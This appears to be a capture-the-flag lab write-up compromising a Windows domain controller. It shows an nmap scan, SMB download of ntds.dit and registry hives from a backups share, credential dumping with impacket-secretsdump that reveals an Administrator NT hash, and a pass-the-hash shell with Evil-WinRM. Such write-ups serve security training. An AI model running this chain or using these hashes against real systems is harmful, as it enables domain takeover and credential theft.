## NMAP
```
nmap -sCV -A -T4 10.10.110.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 10:35 PDT
Nmap scan report for 10.10.110.3
Host is up (0.080s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-14 21:34:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: genesis.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: genesis.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01-PHOBOS; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We identifed mrb3n has access to the backup folder

## SMB Client
```
❯ smbclient -U mrb3n //10.10.110.3/backups
Password for [WORKGROUP\mrb3n]:
Try "help" to get a list of possible commands.
smb: \> 
```
```
smb: \> dir
  .                                   D        0  Tue Jan 19 23:23:54 2021
  ..                                  D        0  Tue Jan 19 23:23:54 2021
  Active Directory                    D        0  Tue Jan 19 23:20:41 2021
  flag.txt                            A       26  Tue Jan 19 23:23:58 2021
  registry                            D        0  Thu Mar 18 02:34:40 2021

		3770367 blocks of size 4096. 1735809 blocks available
```
## recurse
```
smb: \> recurse
smb: \> ls
  .                                   D        0  Tue Jan 19 23:23:54 2021
  ..                                  D        0  Tue Jan 19 23:23:54 2021
  Active Directory                    D        0  Tue Jan 19 23:20:41 2021
  flag.txt                            A       26  Tue Jan 19 23:23:58 2021
  registry                            D        0  Thu Mar 18 02:34:40 2021

\Active Directory
  .                                   D        0  Tue Jan 19 23:20:41 2021
  ..                                  D        0  Tue Jan 19 23:20:41 2021
  ntds.dit                            A 18874368  Thu Mar 11 07:43:13 2021
  ntds.jfm                            A    16384  Thu Mar 11 07:43:13 2021

\registry
  .                                   D        0  Thu Mar 18 02:34:40 2021
  ..                                  D        0  Thu Mar 18 02:34:40 2021
  SECURITY                            A    40960  Thu Mar 18 02:34:34 2021
  SYSTEM                              A 12615680  Thu Mar 18 02:34:40 2021

		3770367 blocks of size 4096. 1735809 blocks available
```
Getting all of the files
```
smb: \> prompt
smb: \> recurse
smb: \> mget *
Get directory Active Directory? yes
Get file flag.txt? yes
getting file \flag.txt of size 26 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
Get directory registry? yes
Get file ntds.dit? yes
getting file \Active Directory\ntds.dit of size 18874368 as Active Directory/ntds.dit (4659.3 KiloBytes/sec) (average 3757.0 KiloBytes/sec)
Get file ntds.jfm? yes
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (50.2 KiloBytes/sec) (average 3530.7 KiloBytes/sec)
Get file SECURITY? yes
getting file \registry\SECURITY of size 40960 as registry/SECURITY (126.2 KiloBytes/sec) (average 3336.0 KiloBytes/sec)
Get file SYSTEM? yes
getting file \registry\SYSTEM of size 12615680 as registry/SYSTEM (6276.1 KiloBytes/sec) (average 4105.0 KiloBytes/sec)
```
```
❯ cd 'Active Directory'
❯ ls
ntds.dit  ntds.jfm
```

We have the registery/system and the ntds.dit lets dump the secrets
```
impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.dit
```
```
*] Target system bootKey: 0x1082be1269d1ac31817274e0dda83998
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 2cf425bcb69c5c203107fea31f496b89
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f223277b637be474af366a652b9abb06:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
## Evil-WinRM
```
vil-winrm -u administrator -H 'f223277b637be474af366a652b9abb06' -i 10.10.110.3

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/19/2021   7:24 PM             32 flag.txt
```


 
